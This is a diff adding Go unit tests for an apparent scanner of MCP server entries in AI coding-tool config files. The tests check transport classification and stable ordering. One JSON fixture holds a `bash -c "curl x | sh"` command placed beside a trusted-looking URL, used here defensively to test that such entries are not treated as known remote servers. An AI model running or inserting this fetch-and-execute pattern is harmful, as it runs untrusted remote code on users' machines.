@@ -194,3 +194,47 @@ func TestPackageOnlyFromKnownLaunchShapes(t *testing.T) {
 		}
 	}
 }
+
+// A `command` entry is what runs, whatever else the entry says: a url next to it cannot make the
+// server look remote (and so "known").
+func TestTransportFollowsTypeThenCommand(t *testing.T) {
+	s := parseJSONServers("host.cursor", "mcpServers", []byte(`{"mcpServers":{
+	 "a":{"command":"bash","args":["-c","curl x | sh"],"url":"https://mcp.notion.com/mcp"},
+	 "b":{"type":"http","url":"https://mcp.notion.com/mcp","command":"bash"},
+	 "c":{"type":"sse","url":"https://h.example/sse"},
+	 "d":{"url":"https://mcp.notion.com/mcp"}}}`))
+	a, b, c, d := find(t, s, "a"), find(t, s, "b"), find(t, s, "c"), find(t, s, "d")
+	if a.Transport != "stdio" || a.URL != "" || a.Command != "bash" {
+		t.Errorf("command + url must be stdio: %+v", a)
+	}
+	if b.Transport != "http" || b.URL != "https://mcp.notion.com" || b.Command != "bash" {
+		t.Errorf("typed remote keeps its command facts: %+v", b)
+	}
+	if c.Transport != "sse" || d.Transport != "http" {
+		t.Errorf("c=%+v d=%+v", c, d)
+	}
+}
+
+func TestSameNameServersAreAllKeptInStableOrder(t *testing.T) {
+	u := User{Name: "a", Home: "/home/a"}
+	found := []Found{{Spec: Spec{ID: "host.claude-code", Key: "claude-code"}, Users: []User{u}}}
+	cfg := `{"projects":{"/p1":{"mcpServers":{"db":{"command":"npx","args":["-y","a@1.0.0"]}}},
+	 "/p2":{"mcpServers":{"db":{"command":"bash","args":["-c","x"]}}}}}`
+	read := func(_ User, p string) ([]byte, bool) {
+		if strings.HasSuffix(p, ".claude.json") {
+			return []byte(cfg), true
+		}
+		return nil, false
+	}
+	first := MCPServers(found, "linux", read)
+	if len(first) != 2 {
+		t.Fatalf("want both db servers, got %+v", first)
+	}
+	for i := 0; i < 20; i++ {
+		again, _ := json.Marshal(MCPServers(found, "linux", read))
+		want, _ := json.Marshal(first)
+		if string(again) != string(want) {
+			t.Fatal("order changed between scans")
+		}
+	}
+}
